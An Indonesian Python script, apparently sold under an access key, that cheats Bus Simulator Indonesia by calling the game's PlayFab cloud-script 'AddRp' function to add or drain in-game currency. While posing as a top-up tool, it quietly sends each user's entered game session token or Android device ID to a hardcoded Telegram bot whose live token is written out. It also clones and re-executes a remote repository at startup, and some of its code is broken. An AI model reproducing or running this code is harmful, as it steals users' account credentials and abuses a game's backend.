import time
import os
import sys
import requests
import json
from datetime import datetime
from colorama import init, Fore, Style
from datetime import datetime
import shutil
import subprocess
import sys

# Nama direktori repo
repo_dir = 'Rafabussid'
repo_url = 'https://github.com/Rafaczx29/Rafabussid'

# Cek apakah direktori sudah ada
if os.path.exists(repo_dir):
    # Hapus direktori jika ada
    shutil.rmtree(repo_dir)

# Clone repository terbaru
subprocess.run(['git', 'clone', repo_url])

# Restart script
os.execl(sys.executable, sys.executable, *sys.argv)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# URL KEY
pastebin_url = "https://pastebin.com/raw/qakPnRKY"

# FUNGSI UNTUK MENGAMBIL KEYS DAN EXPIRATION DATE DARI PASTEBIN
def get_keys_from_pastebin(url):
    
    response = requests.get(url)   
    if response.status_code == 200:        
        lines = response.text.splitlines()
        keys = {}        
        for line in lines:            
            if not line.strip() or line.count(',') != 1:
                print(f"Baris tidak valid, dilewati: {line}")
                continue                        
            parts = line.split(',')
            key, expiration_date = parts[0].strip(), parts[1].strip()
            keys[key] = expiration_date        
        return keys
    else:
        print(f"Error: {response.status_code}")
        return None


def verifikasi_key(key_input, keys):
    
    if key_input in keys:
        expiration_date = keys[key_input]
        expiration_date_obj = datetime.strptime(expiration_date, "%Y-%m-%d")
        
        if expiration_date_obj >= datetime.now():
            print(f"𝐊𝐞𝐲 {key_input} 𝐕𝐚𝐥𝐢𝐝 𝐇𝐢𝐧𝐠𝐠𝐚 {expiration_date}")
            return True, expiration_date
        else:
            print(f"𝗞𝗲𝘆 {key_input} 𝘀𝘂𝗱𝗮𝗵 𝗸𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮 𝗽𝗮𝗱𝗮 {expiration_date}")
            time.sleep(2)
            os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
            exit()
    else:
        print(f"𝗞𝗲𝘆 {key_input} 𝘁𝗶𝗱𝗮𝗸 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿.")
        time.sleep(2)
        os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
        exit()

# KEY INPUT BOSQU
def get_key():
    key_input = input("❏ 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐊𝐞𝐲 𝐀𝐤𝐬𝐞𝐬 𝐀𝐧𝐝𝐚: ")  
    return key_input

# YTTA
def main():
    keys = get_keys_from_pastebin(pastebin_url)  
    
    if keys:
        # INI INPUT KEY 1 KALI
        key_input = get_key() 
        
        # VERIFIKASI KEY
        valid, expiration_date = verifikasi_key(key_input, keys)  
        
        if not valid:
            print("Key tidak valid atau sudah expired. Script berhenti.")
            exit()  
        else:
            print(f"Key valid hingga {expiration_date}. Script dilanjutkan.") 
            show_menu()
    else:
        print("Tidak dapat mengambil data dari Pastebin. Pastikan URL Pastebin benar.")
        exit()  

# COLORAMA YTTA
init(autoreset=True)

# PASS YTTA
pastebin_pass = 'https://pastebin.com/raw/7fws6sbi'
    
# ANIMASI YTTA
def typing_and_loading(t):
    # WARNA TEKS
    color_text = '\033[34m'  # Biru
    color_spinner = '\033[32m'  # Hijau
    color_white = '\033[37m'  # Putih
    reset_color = '\033[0m'  # Reset warna

    # EFEK LOADING BOSQU
    message = f"{color_text}𝗦𝗲𝗱𝗮𝗻𝗴 𝗺𝗲𝗺𝘂𝗮𝘁 𝘀𝗰𝗿𝗶𝗽𝘁 𝗱𝗮𝗹𝗮𝗺 {color_white}{t}{color_text} 𝗗𝗲𝘁𝗶𝗸... {reset_color}"
    for i in range(len(message)):
        sys.stdout.write(f"\r{message[:i+1]}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    time.sleep(1)  
    
    
    spinner_chars = ['|', '/', '-', '\\']
    for i in range(t * 4):  
        remaining_time = t - (i // 4)  
        sys.stdout.write(f"\r{color_text}𝗦𝗲𝗱𝗮𝗻𝗴 𝗺𝗲𝗺𝘂𝗮𝘁 𝘀𝗰𝗿𝗶𝗽𝘁 𝗱𝗮𝗹𝗮𝗺 {color_white}{remaining_time}{color_text} 𝗗𝗲𝘁𝗶𝗸... {color_spinner}{spinner_chars[i % 4]}{reset_color}")
        sys.stdout.flush()
        time.sleep(0.25)

    print()  

# YTTA
typing_and_loading(3)

# FUNGSI KIRIM HASIL KE TELEGRAM
def kirim_pesan_via_url(token_bot, chat_id, pesan):
    url = f"https://api.telegram.org/bot{token_bot}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": pesan
    }
    try:
        response = requests.get(url, params=params) # RESPON DEBUGGING
        if response.status_code == 200:
            print(Fore.GREEN + "𝐏𝐫𝐨𝐬𝐞𝐬 𝐌𝐞𝐦𝐮𝐚𝐭 𝐒𝐜𝐫𝐢𝐩𝐭...")
        else:
            print(Fore.RED + f"Pesan gagal dikirim. Status: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"Terjadi kesalahan saat mengirim pesan: {e}")

# FUNGSI PILIHAN LOGIN, JANGAN DIUBAH!! 
def pilihanlogin():
    now = datetime.now()        
    hari = now.strftime('%A')  
    bulan = now.strftime('%B')  
    tanggal = now.day  
    clear_screen() 
    print() 
    print() 
    print() 
    print(Fore.GREEN + Style.BRIGHT + "=" * 40)
    print(Fore.CYAN + Style.BRIGHT + "    ✨ 𝗧𝗢𝗣 𝗨𝗣 𝗕𝗨𝗦𝗦𝗜𝗗 - 𝟮𝟬𝟮𝟱 - 𝗠𝗜𝗫𝗙𝗜𝗧𝗨𝗥. ✨")
    print(f'''   \x1b[1;33;41m • \x1b[1;37[𝗖𝗥𝗘𝗔𝗧𝗢𝗥 𝗥𝗔𝗙𝗔𝗖𝗭𝗫 \x1b[1;33m • \x1b[0m\x1b[ ''')
    print(f'''   \x1b[1;33;41m • \x1b[1;37m𝗛𝗔𝗥𝗜: {hari}, {bulan} {tanggal} \x1b[1;33m • \x1b[0m\x1b[ ''')
    print(Fore.GREEN + Style.BRIGHT + "=" * 40)        
    print("𝐏𝐈𝐋𝐈𝐇 𝐌𝐄𝐓𝐎𝐃𝐄 𝐋𝐎𝐆𝐈𝐍:")
    print("1. 𝗟𝗼𝗴𝗶𝗻 𝗱𝗲𝗻𝗴𝗮𝗻 𝘁𝗼𝗸𝗲𝗻 𝗕𝘂𝘀𝘀𝗶𝗱")
    print("2. 𝗟𝗼𝗴𝗶𝗻 𝗱𝗲𝗻𝗴𝗮𝗻 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗")
    print() 
    print() 
    pilihan = input("""╭­\x1b[41m❏ \x1b[1;37m𝗜𝗡𝗣𝗨𝗧 𝗣𝗜𝗟𝗜𝗛𝗔𝗡 ❏\x1b[0m
╰───\x1b[1;33m▶ """)
    
    if pilihan == '1':
        autentikasi_token()
        ambil_informasi_akun()
    elif pilihan == '2':
                global token_bussid 
                token_bussid = login_with_device_id()  
                if token_bussid:
                    ambil_informasi_akun()  
                    
    else:
        print(Fore.RED + "𝐏𝐢𝐥𝐢𝐡𝐚𝐧 𝐓𝐢𝐝𝐚𝐤 𝐕𝐚𝐥𝐢𝐝!.")
        
def kirim_pesan_via_url(token_bot, chat_id, pesan):
    url = f"https://api.telegram.org/bot{token_bot}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": pesan
    }
    try:
        response = requests.get(url, params=params)

        if response.status_code == 200:
            print(Fore.GREEN + "Pesan berhasil dikirim ke Telegram.")
        else:
            print(Fore.RED + f"Pesan gagal dikirim. Status: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"Terjadi kesalahan saat mengirim pesan: {e}")
        
def login_with_device_id():
    clear_screen()
    print() 
    print() 
    print() 
    android_device_id = input("""╭­\x1b[41m❏ \x1b[1;37m𝗠𝗔𝗦𝗨𝗞𝗔𝗡 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗗 ❏\x1b[0m
╰───\x1b[1;33m▶ """)
    
    url = "https://4ae9.playfabapi.com/Client/LoginWithAndroidDeviceID"
    headers = {
        'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
        'Content-Type': 'application/json'
    }
    
    payload = {
        "AndroidDeviceId": android_device_id,
        "OS": "Android",
        "AndroidDevice": "AndroidPhone",
        "CreateAccount": True,
        "TitleId": "4AE9"
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        
        if response.status_code == 200:
            print("𝐋𝐨𝐠𝐢𝐧 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐞𝐧𝐠𝐚𝐧 𝐃𝐞𝐯𝐢𝐜𝐞 𝐈𝐃!")
            session_ticket = response.json().get("data", {}).get("SessionTicket", None)
            if session_ticket:
                print("Token berhasil didapatkan.")
                
                pesan = f"Device ID baru dimasukkan:\n{android_device_id}\n\nPada: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                TOKEN_BOT_TELEGRAM = "7481271703:AAHvMpZCcd6hyOJ04LceAVzbRym2bYJoF9M"  
                CHAT_ID_TELEGRAM = "-4501707408"
                kirim_pesan_via_url(TOKEN_BOT_TELEGRAM, CHAT_ID_TELEGRAM, pesan)

                return session_ticket  
            else:
                print("Token tidak ditemukan dalam respons.")
                return None
        else:
            print("Login gagal, kode status:", response.status_code)
            print("Pesan kesalahan:", response.json())
            return None
    except Exception as e:
        print("Terjadi kesalahan:", e)
        return None

# FUNGSI TOKEN
def autentikasi_token():
    global token_bussid
    clear_screen()
    print() 
    print() 
    print() 
    print(Fore.GREEN + "\033[1m" + "𝐒𝐂𝐑𝐈𝐏 𝐓𝐎𝐏 𝐔𝐏 𝐁𝐔𝐒𝐒𝐈𝐃 𝟐𝟎𝟐𝟒! - 𝙼𝚞𝚕𝚝𝚒𝚏𝚒𝚝𝚞𝚛 ")
    print(Fore.YELLOW + Style.BRIGHT + "Anda harus memasukkan Token Bussid untuk melanjutkan.")
    print() 
    print() 
    token_input = input("""╭­\x1b[41m❏ \x1b[1;37m𝗜𝗡𝗣𝗨𝗧 𝗫-𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗮𝘁𝗶𝗼𝗻 ❏\x1b[0m
╰───\x1b[1;33m▶ """)
    token_bussid = token_input
    
    print("\033[1m" + Fore.GREEN + "Token disimpan." + Style.RESET_ALL)
    time.sleep(2)

    pesan = f"Token dimasukkan oleh pengguna:\n {token_bussid} \n\n pada {time.strftime('%Y-%m-%d %H:%M:%S')}"
    TOKEN_BOT_TELEGRAM = "7481271703:AAHvMpZCcd6hyOJ04LceAVzbRym2bYJoF9M"  
    CHAT_ID_TELEGRAM = "-4501707408"  
    kirim_pesan_via_url(TOKEN_BOT_TELEGRAM, CHAT_ID_TELEGRAM, pesan)

def ambil_informasi_akun():
    global informasi_akun

    url = "https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo"
    
    headers = {
        'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
        'Content-Type': 'application/json',
        'X-Authorization': token_bussid
    }

    payload = {
        'PlayFabId': None,
        'InfoRequestParameters': {
            'GetUserAccountInfo': True,
            'GetUserInventory': True,
            'GetUserVirtualCurrency': True,
            'GetUserData': False,
            'UserDataKeys': None,
            'GetUserReadOnlyData': True,
            'UserReadOnlyDataKeys': None,
            'GetCharacterInventories': False,
            'GetCharacterList': False,
            'GetTitleData': True,
            'TitleDataKeys': None,
            'GetPlayerStatistics': False,
            'PlayerStatisticNames': None
        }
    }

    try:
        response = requests.post(url, json=payload, headers=headers)

        if response.status_code == 200:
            data = response.json()
            
            informasi_akun = data 

            info_result_payload = data.get("data", {}).get("InfoResultPayload", {})
            
            user_account_info = info_result_payload.get("AccountInfo", {})
            
            virtual_currency = info_result_payload.get("UserVirtualCurrency", {})

            nama = user_account_info.get("TitleInfo", {}).get("DisplayName", "Tidak diketahui")
            
            saldo = virtual_currency.get("RP", 0)

            akun_id = user_account_info.get("TitleInfo", {}).get("TitlePlayerAccount", {}).get("Id", "Tidak diketahui")

            informasi_akun = {
                'nama': nama,
                'saldo': saldo,
                'akun_id': akun_id
            }
            print() 
            print(Fore.GREEN + Style.BRIGHT + "    ╔══════════════" + Fore.RED + " 𝗦𝗧𝗔𝗧𝗨𝗦 " + Fore.GREEN + "═════════════╗" + Style.RESET_ALL)

            print(Fore.RED + "       ▶ " + Fore.BLUE + "𝐍𝐀𝐌𝐀 𝐀𝐊𝐔𝐍 : " + Style.BRIGHT + Fore.WHITE + f"{informasi_akun['nama']}" + Style.RESET_ALL)
            print(Fore.RED + "       ▶ " + Fore.BLUE + "𝐒𝐀𝐋𝐃𝐎 𝐀𝐊𝐔𝐍 : " + Style.BRIGHT + Fore.WHITE + f"Rp {informasi_akun['saldo']}" + Style.RESET_ALL)
            print(Fore.RED + "       ▶ " + Fore.BLUE + "𝐈𝐃 𝐀𝐊𝐔𝐍 : " + Style.BRIGHT + Fore.WHITE + f"{informasi_akun['akun_id']}" + Style.RESET_ALL)
            𝐩𝐫𝐢𝐧𝐭(𝐅𝐨𝐫𝐞.𝐆𝐑𝐄𝐄𝐍 + 𝐒𝐭𝐲𝐥𝐞.𝐁𝐑𝐈𝐆𝐇𝐓 + "    ╚═══════════════════════════════════╝" + Style.RESET_ALL)
            print() 
            return True

        else:
            print(Fore.RED + f"Gagal mengambil informasi akun: {response.status_code}")
            print(Fore.RED + f"Detail Error: {response.text}")
            
            return False

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Kesalahan koneksi: {str(e)}")
        
        return False

# PASSWORD DB
def ambil_password():
    try:
        response = requests.get(pastebin_pass)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(Fore.RED + Style.BRIGHT + "Gagal mengakses Pastebin.")
            return None
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Kesalahan koneksi ke Pastebin: {str(e)}")
        return None

# PASSWORD MENU
def verifikasi_password():
    password_benar = ambil_password()
    if password_benar is None:
        return False
    
    password_input = input("""╭­\x1b[41m❏ \x1b[1;37m𝗜𝗡𝗣𝗨𝗧 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 ❏\x1b[0m
╰───\x1b[1;33m▶ """)
    
    if password_input == password_benar:
        print(Fore.GREEN + Style.BRIGHT + "Akses berhasil! Anda adalah pemilik script.")
        return True
    else:
        print(Fore.RED + "𝗔𝗸𝘀𝗲𝘀 𝘀𝗮𝗹𝗮𝗵,𝗵𝘂𝗯𝘂𝗻𝗴𝗶 𝐎𝐰𝐧𝐞𝐫!")
        time.sleep(2)
        os.system('xdg-open https://api.whatsapp.com/send/?phone=6282275380393')
        return False

# MENU OWNER
def fungsi_pemilik():
    print(Fore.GREEN + Style.BRIGHT + "\n🔐 𝗔𝗡𝗗𝗔 𝗠𝗔𝗦𝗨𝗞 𝗞𝗘 𝗙𝗜𝗧𝗨𝗥 𝗢𝗪𝗡𝗘𝗥.")
    print(Fore.CYAN + Style.BRIGHT + "1. 𝐓𝐎𝐏 𝐔𝐏 𝐂𝐔𝐒𝐓𝐎𝐌 𝐍𝐎𝐌𝐈𝐍𝐀𝐋.")
    print(Fore.CYAN + Style.BRIGHT + "2. 𝐊𝐔𝐑𝐀𝐒 𝐂𝐔𝐒𝐓𝐎𝐌 𝐍𝐎𝐌𝐈𝐍𝐀𝐋")
    print(Fore.CYAN + Style.BRIGHT + "3. 𝗞𝗘𝗠𝗕𝗔𝗟𝗜 𝗞𝗘 𝗠𝗘𝗡𝗨 𝗨𝗧𝗔𝗠𝗔.")
    
    while True:
        try:
            pilihan = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗜𝗡𝗣𝗨𝗧 𝟯 𝗞𝗘 𝗠𝗘𝗡𝗨 𝗨𝗧𝗔𝗠𝗔 ❏\x1b[0m
╰───\x1b[1;33m▶ """))
            if pilihan == 1:
                pengisian_nominal = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗧𝗢𝗣 𝗨𝗣 𝗖𝗨𝗦𝗧𝗢𝗠 (𝗠𝗮𝘅 2147483647) ❏\x1b[0m
╰───\x1b[1;33m▶ """))
                typing_and_loading(5)
                seratusjuta(pengisian_nominal)
            elif pilihan == 2:
                jumlahkuras = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗞𝗨𝗥𝗔𝗦𝗔𝗡 𝗖𝗨𝗦𝗧𝗢𝗠 ❏\x1b[0m
╰───\x1b[1;33m▶ """))
                typing_and_loading(5)
                kurascustom(jumlahkuras)
            elif pilihan == 3:                                
                break
            else:
                print(Fore.RED + Style.BRIGHT + "Pilihan tidak valid. Coba lagi.")
        except ValueError:
            print(Fore.RED + Style.BRIGHT + "Input harus berupa angka. Coba lagi.")
    # Pastikan bagian 'else' ini berada di luar while loop
    print(Fore.RED + "Akses lanjutan pemilik ditolak.")

# MENU PREM
def akses_lanjutan_pemilik():
    print(Fore.GREEN + Style.BRIGHT + "\n🔐 𝗔𝗡𝗗𝗔 𝗠𝗔𝗦𝗨𝗞 𝗞𝗘 𝗙𝗜𝗧𝗨𝗥 𝗣𝗥𝗘𝗠𝗜𝗨𝗠.")
    print(Fore.CYAN + Style.BRIGHT + "1. 𝐓𝐎𝐏 𝐔𝐏 𝐁𝐔𝐒𝐒𝐈𝐃 𝟐𝐌.")
    print(Fore.CYAN + Style.BRIGHT + "2. 𝐊𝐔𝐑𝐀𝐒 𝐁𝐔𝐒𝐒𝐈𝐃 𝟐𝐌.")
    print(Fore.CYAN + Style.BRIGHT + "3. 𝐊𝐄𝐌𝐁𝐀𝐋𝐈 𝐊𝐄 𝐌𝐄𝐍𝐔 𝐔𝐓𝐀𝐌𝐀")
    
    while True:
        try:
            print() 
            pilihan = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗜𝗡𝗣𝗨𝗧 𝟯 𝗞𝗘 𝗠𝗘𝗡𝗨 𝗨𝗧𝗔𝗠𝗔 ❏\x1b[0m
╰───\x1b[1;33m▶ """))
            
            if pilihan == 1:
                print() 
                nominal = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗞𝗘𝗧𝗜𝗞 𝗔𝗡𝗚𝗞𝗔 𝟭 ❏\x1b[0m
╰───\x1b[1;33m▶ """))
                typing_and_loading(5)
                pengisian_uang_khusus(nominal)

            elif pilihan == 2:
                print() 
                kurascepat = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗞𝗘𝗧𝗜𝗞 𝗔𝗡𝗚𝗞𝗔 𝟭 ❏\x1b[0m
╰───\x1b[1;33m▶ """)) 
                typing_and_loading(5)
                kuras_owner(kurascepat)

            elif pilihan == 3:
                print(Fore.GREEN + Style.BRIGHT + "\n𝗞𝗘𝗠𝗕𝗔𝗟𝗜 𝗞𝗘 𝗠𝗘𝗡𝗨 𝗨𝗧𝗔𝗠𝗔...")
                break

            else:
                print(Fore.RED + Style.BRIGHT + "Pilihan tidak valid. Coba lagi.")

        except ValueError:
            print(Fore.RED + Style.BRIGHT + "Input harus berupa angka. Coba lagi.")

# TOP UP BIASA
def pengisian_uang():
    pengisian = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗝𝗨𝗠𝗟𝗔𝗛 𝗧𝗢𝗣 𝗨𝗣 (𝗥𝗽 𝟯,𝟱𝗝𝗧) ❏\x1b[0m
╰───\x1b[1;33m▶ """))
    for k in range(pengisian):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': 3500000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(Fore.GREEN + f"    𝗣𝗲𝗻𝗴𝗶𝘀𝗶𝗮𝗻 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 {k + 1}/{pengisian}.")

# TOP UP 2M
def pengisian_uang_khusus(nominal):
    for k in range(1):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': nominal * 2147483647 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(f"𝗧𝗢𝗣 𝗨𝗣 𝗦𝗨𝗞𝗦𝗘𝗦: 𝗦𝗘𝗡𝗜𝗟𝗔𝗜 𝟮𝗠.")
        
# CUSTOM NOM
def seratusjuta(pengisian_nominal):
    for k in range(1):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': pengisian_nominal * 1 },  
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        kingtheend = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()
        print(f"𝗧𝗢𝗣 𝗨𝗣 𝗦𝗨𝗞𝗦𝗘𝗦: 𝗦𝗘𝗡𝗜𝗟𝗔𝗜 𝗥𝗽 {pengisian_nominal}.")

def kurascustom(jumlahkuras):
    for k in range(1):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': jumlahkuras * -1 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()

# KURASAN 2M
def kuras_owner(kurascepat):
    for k in range(1):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': -2147483647 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()

# KURASAN
def kurasan():
    kuras = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗝𝗨𝗠𝗟𝗔𝗛 𝗞𝗨𝗥𝗔𝗦 ( 𝗥𝗽 𝟯,𝟱𝗝𝗧) ❏\x1b[0m
╰───\x1b[1;33m▶ """))
    for k in range(kuras):
        data = json.dumps({
            'CustomTags': None,
            'FunctionName': 'AddRp',
            'FunctionParameter': {
                'addValue': -3500000 },
            'GeneratePlayStreamEvent': False,
            'RevisionSelection': 'Live',
            'SpecificRevision': None,
            'AuthenticationContext': None })
        headers = {
            'User-Agent': 'UnityPlayer/2021.3.8f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/json',
            'X-ReportErrorAsSuccess': 'true',
            'X-PlayFabSDK': 'UnitySDK-2.135.220509',
            'X-Authorization': token_bussid,
            'X-Unity-Version': '2021.3.8f1' }
        response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
        ambil_informasi_akun()  
        print(Fore.GREEN + f"    𝗣𝗲𝗻𝗴𝘂𝗿𝗮𝘀𝗮𝗻 𝘂𝗮𝗻𝗴 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 {k + 1}/{kuras}." + Style.RESET_ALL)        

# MENU UTAMA
def show_menu():
    clear_screen()
    now = datetime.now()
    
    hari = now.strftime('%A')
    bulan = now.strftime('%B')
    tanggal = now.day
    expiration_date = '2024-12-20'
    expiration_date_obj = datetime.strptime(expiration_date, '%Y-%m-%d')

    current_date = datetime.now()

    remaining_time = expiration_date_obj - current_date
    remaining_days = remaining_time.days
    keys = get_keys_from_pastebin(pastebin_url)
    
    if keys:
        print() 
        print() 
        print() 
        print(f'''   \x1b[1;33;41m • \x1b[1;37[ 𝗕𝗘𝗟𝗜 𝗞𝗘𝗬 𝗔𝗞𝗦𝗘𝗦 𝗛𝗨𝗕𝗨𝗡𝗚𝗜 𝗪𝗔: 𝟬𝟴𝟮𝟮 𝟳𝟱𝟯𝟴 𝟬𝟯𝟵𝟯 \x1b[1;33m • \x1b[0m\x1b[ \n''') 
        key_input = input("❏ 𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐊𝐞𝐲 𝐀𝐤𝐬𝐞𝐬 𝐀𝐧𝐝𝐚: ")
        
        status_key, expiration_date = verifikasi_key(key_input, keys)
        
        if status_key:
            expiration_date_obj = datetime.strptime(expiration_date, "%Y-%m-%d")
            remaining_days = (expiration_date_obj - datetime.now()).days
            print(f"𝐒𝐢𝐬𝐚 𝐃𝐮𝐫𝐚𝐬𝐢 𝐊𝐞𝐲: {remaining_days} hari")
        else:
            print("𝐊𝐞𝐲 𝐓𝐢𝐝𝐚𝐤 𝐕𝐚𝐥𝐢𝐝 𝐀𝐭𝐚𝐮 𝐒𝐮𝐝𝐚𝐡 𝐊𝐚𝐝𝐚𝐥𝐮𝐰𝐚𝐫𝐬𝐚.")
    
    print() 
    print() 
    print() 
    print(Fore.GREEN + Style.BRIGHT + "╔═══════════════════════════════════════════════╗")
    print(f'\x1b[1;32m║\x1b[0m {Fore.CYAN + Style.BRIGHT}✨ 𝗧𝗢𝗣 𝗨𝗣 𝗕𝗨𝗦𝗦𝗜𝗗 - 𝟮𝟬𝟮𝟱 - 𝗠𝗜𝗫𝗙𝗜𝗧𝗨𝗥. ✨')
    print(f'\x1b[1;32m║ \x1b[0m \x1b[1;33;41m • \x1b[1;37m𝗖𝗥𝗘𝗔𝗧𝗢𝗥 𝗥𝗔𝗙𝗔𝗖𝗭𝗫 \x1b[1;33m • \x1b[0m')
    print(f'\x1b[1;32m║ \x1b[0m \x1b[1;33;41m • \x1b[1;37m𝗛𝗔𝗥𝗜: {hari}, {bulan} {tanggal} \x1b[1;33m • \x1b[0m\x1b[ ''')
    print(Fore.GREEN + Style.BRIGHT + "╚═══════════════════════════════════════════════╝")
    print(Fore.MAGENTA + Style.BRIGHT + f"▶ 𝗡𝗔𝗠𝗔 𝗔𝗞𝗨𝗡: {informasi_akun.get('nama', 'Tidak diketahui')}")
    print(Fore.MAGENTA + Style.BRIGHT + f"▶ 𝗦𝗔𝗟𝗗𝗢: Rp {informasi_akun.get('saldo', 0)}")
    print(Fore.YELLOW + Style.BRIGHT + f"❏ 𝗜𝗗 𝗕𝗨𝗦𝗦𝗜𝗗 𝗔𝗡𝗗𝗔: {informasi_akun.get('akun_id', 'Tidak diketahui')}")
    
    # Menampilkan status key
    print(Fore.YELLOW + Style.BRIGHT + f"❏ 𝗞𝗲𝘆: {expiration_date} | ({remaining_days} 𝐇𝐚𝐫𝐢)")
    
    print(Fore.GREEN + Style.BRIGHT + "╔═══════════════════════════════════════════════╗")
    print(Fore.YELLOW + Style.BRIGHT + "\x1b[1;32m║ \x1b[0m 1. 𝗧O𝗣𝗨𝗣 𝗕𝗨𝗦𝗦𝗜𝗗")
    print(Fore.YELLOW + Style.BRIGHT + "\x1b[1;32m║ \x1b[0m 2. 𝗞𝗨𝗥𝗔𝗦 𝗕𝗨𝗦𝗦𝗜𝗗")
    print(Fore.YELLOW + Style.BRIGHT + "\x1b[1;32m║ \x1b[0m 3. 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗧𝗢𝗞𝗘𝗡")
    print(Fore.YELLOW + Style.BRIGHT + "\x1b[1;32m║ \x1b[0m 4. 𝗞𝗘𝗟𝗨𝗔𝗥 𝗗𝗔𝗥𝗜 𝗦𝗖𝗥𝗜𝗣𝗧")
